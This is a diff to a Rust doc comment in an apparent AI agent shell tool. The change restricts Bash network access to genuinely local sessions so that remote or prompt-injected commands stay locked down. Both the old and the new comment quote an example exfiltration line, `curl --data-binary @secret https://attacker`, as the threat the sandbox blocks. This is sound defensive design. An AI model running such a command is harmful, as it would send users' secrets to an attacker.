@@ -40,16 +40,22 @@ const MAX_TIMEOUT_MS: u64 = 600_000;
 /// unconditionally. `PATH` etc. still pass through so commands work.
 ///
 /// **Network (M-3 / M-7 / sandbox-2 / tools-exec-15 / #657):** agent-initiated
-/// Bash egress is gated on the WORKSPACE TRUST POSTURE. A `Trusted` workspace
-/// (the user's own machine — the default hands-on-keyboard experience) runs
-/// with [`NetworkPolicy::Inherit`], so `git fetch`, package installs, and
-/// `curl` just work. A `Contained` / untrusted workspace — where attacker-
-/// influenced content may run — DENIES egress ([`NetworkPolicy::Deny`]), so a
-/// prompt-injected command (`curl --data-binary @secret https://attacker`)
-/// cannot exfiltrate sandbox-readable data or reach internal/metadata
-/// endpoints. On a Contained workspace `WAYLAND_BASH_ALLOW_NETWORK=1` is the
-/// explicit operator opt-in (via [`default_bash_network_policy`]); when no
-/// WorkspacePolicy is attached at all, the conservative default is Deny.
+/// Bash egress is gated on whether this is a GENUINELY-LOCAL session, NOT on
+/// the workspace trust posture. [`NetworkPolicy::Inherit`] (so `git fetch`,
+/// package installs, and `curl` just work) is granted ONLY when the session
+/// has no channel tool posture (`channel_tool_posture.is_none()`, i.e. a local
+/// CLI/TUI/json-stream/ACP/desktop entrypoint), via the `local_bash_network`
+/// helper and the `with_network` grant applied at bootstrap. This distinction
+/// is load-bearing: a channel-attached session (including a `Full`-posture
+/// remote sender) also resolves to `WorkspaceTrust::Trusted` through
+/// `trusted_local`, so gating on trust alone would hand a remote sender a
+/// networked shell. Every channel path therefore stays on the fail-safe
+/// [`NetworkPolicy::Deny`] lockdown, so a prompt-injected or remote command
+/// (`curl --data-binary @secret https://attacker`) cannot exfiltrate
+/// sandbox-readable data or reach internal/metadata endpoints. On any
+/// non-local session `WAYLAND_BASH_ALLOW_NETWORK=1` is the explicit operator
+/// opt-in (via [`default_bash_network_policy`]); when no WorkspacePolicy is
+/// attached at all, the conservative default is Deny.
 ///
 /// Note: only sandbox backends that honour [`NetworkPolicy`] (bwrap,
 /// sandbox-exec) actually enforce this. `NoSandboxBackend` ignores the
